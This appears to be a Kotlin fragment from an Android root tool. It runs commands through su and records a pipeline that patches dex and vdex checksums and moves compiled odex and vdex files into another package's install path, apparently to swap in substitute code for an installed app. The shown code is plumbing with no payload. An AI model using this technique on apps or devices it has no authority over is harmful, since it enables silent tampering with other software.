            vlog(TAG, t.message.toString())
            false
        }
    }

    private fun runAsRoot(command: List<String>): Triple<Int, String, String> {
        val quoted = command.joinToString(" ") { arg -> "'" + arg.replace("'", "'\\''") + "'" }
        for (su in SU_CANDIDATES) {
            try {
                val process = ProcessBuilder(su, "-c", quoted).start()
                val stdout = readAll(process.inputStream)
                val stderr = readAll(process.errorStream)
                val exit = process.waitFor()
                return Triple(exit, stdout, stderr)
            } catch (t: Throwable) {
                vlog(TAG, t.message.toString())
            }
        }
        return Triple(-1, "", "no su binary could execute the command")
    }

    private fun readAll(stream: java.io.InputStream): String = try {
        BufferedReader(InputStreamReader(stream)).use { it.readText() }
    } catch (t: Throwable) {
        vlog(TAG, t.message.toString())
        ""
    }

    private fun errored(source: String, detail: String) = RunResult(
        sourceApkPath = source,
        targetPackage = "",
        rootAvailable = false, command = emptyList(), exitCode = -1,
        stdout = "", stderr = "",
        outDexPath = "", outOatPath = "",
        outOatExists = false, outOatSizeBytes = 0, instructionSet = currentInstructionSet(),
        classLoaderContext = ClcResolver.FALLBACK_CLC,
        classLoaderContextSource = "not resolved (pipeline errored early)",
        detail = detail,
        originalDexCrc32 = -1L, targetInstallPath = "", workingDexPath = "",
        installedDexCrcs = emptyMap(),
        pathsLengthMatch = false, patchCount = 0, patchApplied = false,
        patchDetail = "not attempted", patchPerDex = emptyList(),
        vdexPatchCount = 0, vdexPatchApplied = false, vdexPatchDetail = "not attempted",
        vdexPatchPerDex = emptyList(),
        permissionsApplied = false, permissionsDetail = "not attempted",
        moveAttempted = false, moveApplied = false,
        movedOdexPath = "", movedVdexPath = "",
        moveDetail = "not attempted",
    )
}
